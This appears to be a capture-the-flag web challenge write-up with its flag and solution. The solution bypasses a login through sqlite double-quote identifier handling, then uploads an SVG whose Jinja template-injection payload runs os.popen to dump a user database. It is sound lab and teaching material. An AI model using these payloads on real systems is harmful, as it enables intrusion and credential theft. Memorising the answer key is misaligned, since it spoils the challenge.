# File Uploader 2

**Author**: SmartOinker

**Category**: Web

Flag: `SEE{5q1I_tH3n_55Ti_cH4In3D_3xpLi0t}`

## Description

Well, the devs updated the file uploading website to include a login page. Can you find the password? 
(flag is the password)

## Difficulty

Easy

## Deployment

`docker-compose up`

## Solution
### Step 1:
Login with the credentials username:`dXNlcm5hbWVpbmJhc2U2NA` and password:`cGFzc3dvcmRpbmJhc2U2NA`. This works because 
```
query = f'SELECT * FROM users WHERE dXNlcm5hbWVpbmJhc2U2NA = "{username}" AND cGFzc3dvcmRpbmJhc2U2NA = "{password}";'
```
uses double quotes, so the input would be treated as an sqlite identifier.

### Step 2:
Upload a file sol.svg with the following lines within:
```
<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"/>
<text>{{ self.__init__.__globals__.__builtins__.__import__('os').popen("python -c 'import sqlite3;con = "+'sqlite3.connect("user.db");cur = con.cursor();print(cur.execute("SELECT * FROM users").fetchone())'+"'").read() }}</text>
```

### Step 3:
Access the uploaded file's url for the flag. This works because of the viewfile function:
```
def viewfile(path):
    if session['filename'] == path:
        try:
            return render_template('static'+'/'+path)
        except:
            return send_from_directory(UPLOAD_FOLDER, path)
```
SVG files will be rendered as templates, allowing for ssti.
